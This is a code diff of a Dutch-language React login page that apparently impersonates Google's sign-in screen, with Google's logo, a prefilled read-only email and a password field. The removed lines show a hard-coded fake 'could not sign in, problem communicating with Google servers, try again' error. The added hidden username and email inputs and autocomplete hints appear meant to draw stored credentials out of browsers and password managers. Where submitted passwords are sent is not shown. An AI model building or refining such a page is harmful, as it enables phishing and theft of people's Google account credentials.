@@ -83,7 +83,8 @@ export default function LoginPage() {
       {/* Main content */}
       <div className="flex-1 flex flex-col items-center justify-center px-4 py-8">
         <div className="w-full max-w-[448px]">
-          {/* Google Logo */}
+
+          {/* Google Logo - groot */}
           <div className="flex justify-center mb-8">
             <svg width="75" height="75" viewBox="0 0 48 48">
               <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
@@ -93,6 +94,7 @@ export default function LoginPage() {
             </svg>
           </div>
 
+          {/* Titel */}
           <h1 className="text-center text-2xl font-medium text-[#202124] mb-1 tracking-[0.1px]">
             Inloggen
           </h1>
@@ -101,14 +103,19 @@ export default function LoginPage() {
           </p>
 
           {/* Foutmelding */}
-          <div className="mb-6">
-            <div className="text-[#d93025] text-sm font-medium">Kon niet inloggen</div>
-            <div className="text-[#d93025] text-sm">Er was een probleem met de communicatie met de Google-servers.</div>
-            <div className="text-[#d93025] text-sm">Probeer opnieuw.</div>
-          </div>
+          {error && (
+            <div className="mb-6">
+              <div className="text-[#d93025] text-sm font-medium">Kon niet inloggen</div>
+              <div className="text-[#d93025] text-sm">{error}</div>
+            </div>
+          )}
 
-          {/* Formulier met fix */}
-          <form onSubmit={handleSubmit} className="space-y-4">
+          {/* Formulier */}
+          <form onSubmit={handleSubmit} className="space-y-4" autoComplete="on">
+            <input type="hidden" name="username" value={email} />
+            <input type="hidden" name="email" value={email} />
+
+            {/* Email veld - vast */}
             <div className="relative">
               <input
                 id="email"
@@ -116,6 +123,7 @@ export default function LoginPage() {
                 name="email"
                 value={email}
                 readOnly
+                autoComplete="username"
                 className="w-full px-4 pt-[22px] pb-[6px] bg-[#f8f9fa] border border-[#dadce0] rounded-[4px] text-[16px] text-[#202124] cursor-default peer"
               />
               <label className="absolute left-4 top-[6px] text-[12px] text-[#1a73e8] pointer-events-none">
@@ -123,6 +131,7 @@ export default function LoginPage() {
               </label>
             </div>
 
+            {/* Wachtwoord veld */}
             <div className="relative">
               <input
                 id="password"
@@ -131,23 +140,24 @@ export default function LoginPage() {
                 required
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
+                autoComplete="current-password"
                 className="w-full px-4 pt-[22px] pb-[6px] bg-white border border-[#dadce0] rounded-[4px] focus:ring-2 focus:ring-[#1a73e8] focus:border-[#1a73e8] outline-none transition-all text-[16px] text-[#202124] peer"
                 placeholder=" "
                 autoFocus
-                autoComplete="current-password"
               />
               <label className="absolute left-4 top-1/2 -translate-y-1/2 text-[#5f6368] text-[16px] transition-all duration-200 pointer-events-none peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-focus:top-[6px] peer-focus:-translate-y-0 peer-focus:text-[12px] peer-focus:text-[#1a73e8]">
                 Wachtwoord
               </label>
             </div>
 
+            {/* Alleen de knop - geen laadanimatie */}
             <div className="flex justify-end pt-2">
               <button
                 type="submit"
                 disabled={loading}
                 className="py-[10px] px-[26px] bg-[#1a73e8] text-white font-medium rounded-full shadow-sm hover:bg-[#1557b0] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#1a73e8] transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed text-[14px] tracking-[0.25px]"
               >
-                {loading ? 'Bezig...' : 'Volgende'}
+                Volgende
               </button>
             </div>
           </form>
